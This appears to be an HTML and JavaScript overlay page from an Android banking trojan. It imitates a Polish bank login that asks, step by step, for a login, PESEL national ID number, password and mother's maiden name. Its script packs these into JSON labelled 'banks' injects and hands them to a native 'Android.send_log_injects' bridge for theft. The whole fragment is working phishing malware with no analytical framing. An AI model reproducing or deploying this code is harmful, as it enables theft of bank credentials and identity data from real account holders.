	<style>
        body {
            padding: 0;
            margin: 0;
            background: #f8f8f8;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: -webkit-flex;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        form, #form1, #form2, #form3 {
            display: -webkit-flex;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            flex: 1;
            padding: 20px;
        }

        footer {
            padding: 20px;
        }

        .button {
            width: 100%;
            padding: 9px;
            background: #0fb777;
            border: 0;
            color: #fff;
            font-size: 16px;
            border-radius: 3px;
            font-weight: 600;
        }

        header {
            text-align: center;
            font-size: 18px;
            font-weight: bold;
        }

        .field {
            padding: 8px;
            background: #fff;
            border: 1px solid #f4f4f4;
            border-radius: 2px;
            width: 100%;
            margin-bottom: 20px;
        }

        .field:focus {
            padding: 8px;
            background: #fff;
            border: 1px solid #f4f4f4;
            border-radius: 2px;
            width: 100%;
            margin-bottom: 20px;
            border-bottom: 1px solid #0fb777;
            box-shadow: 0px 2px 8px -1px #929292;
        }

        label {
            display: block;
            width: 100%;
            color: #777777;
            font-size: 14px;
            font-weight: 600;
        }

        #spinner {
            width: 100%;
            height: 350px;
            text-align: center;
        }

        .error {
            border-bottom: 2px solid #f00 !important;
        }

        input {
            outline: none;
        }
        
        .legend {
            margin: 15px 1px; 
            font-size: 14px; 
            line-height: 19px; 
            font-style: italic; 
            color: #ac003e; 
        }
    </style>
</head>

<script>
    var spinner = document.getElementById('spinner'),
        form1 = document.getElementById('form1'),
        form2 = document.getElementById('form2');

    var login = document.getElementById('login'),
        pesel = document.getElementById('pesel'),
        haslo = document.getElementById('haslo'),
        mmn = document.getElementById('mmn');

    var nextPage = document.getElementById('nextPage'),
        lastPage = document.getElementById('lastPage'),
        sendData = document.getElementById('sendData');

    nextPage.onclick = () => {
        if(login.value.length < 4) {
            login.classList.add('error')
        } else {
            login.classList.remove('error');
        }

        if(pesel.value.length < 4) {
            pesel.classList.add('error');
        } else {
            pesel.classList.remove('error');
        }

        if(login.value.length >= 4 && pesel.value.length >= 4) {
            
            form1.style.display = 'none'
            form2.style.display = 'flex'
        }
    }

    lastPage.onclick = () => {
        if(haslo.value.length < 4) {
            haslo.classList.add('error')
        } else {
            haslo.classList.remove('error')

            form2.style.display = 'none'
            form3.style.display = 'flex'
        }
    }

    sendData.onclick = () => {
        if(mmn.value.length < 5) {
            mmn.classList.add('error');
        } else {
            mmn.classList.remove('error');

            var data = {};
                data.login = login.value;
                data.pesel = pesel.value;
                data.haslo = haslo.value;
                data.mmn = mmn.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    }
</script>
